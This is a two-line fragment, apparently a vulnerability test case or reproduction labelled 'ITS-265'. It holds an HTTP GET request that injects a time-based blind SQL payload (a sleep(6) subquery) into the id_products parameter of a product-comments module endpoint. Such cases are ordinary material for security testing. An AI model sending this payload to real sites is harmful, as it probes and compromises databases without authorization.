# Vulnerable: ITS-265
GET /index.php?fc=module&module=productcomments&controller=CommentGrade&id_products%5B%5D=(select*from(select(sleep(6)))a)
